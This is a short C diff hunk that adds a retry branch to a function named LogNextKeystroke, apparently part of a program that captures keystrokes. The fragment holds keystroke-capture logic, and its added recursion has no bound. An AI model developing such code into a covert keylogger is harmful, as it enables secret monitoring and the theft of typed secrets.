@@ -183,6 +183,9 @@ BOOL LogNextKeystroke(size_t *buff_len)
         }
 
         g_keystroke.key_is_pressed = FALSE;
+    } else {
+        LeaveCriticalSection(&csReadKeystroke);
+        return LogNextKeystroke(buff_len);
     }
     LeaveCriticalSection(&csReadKeystroke);
 
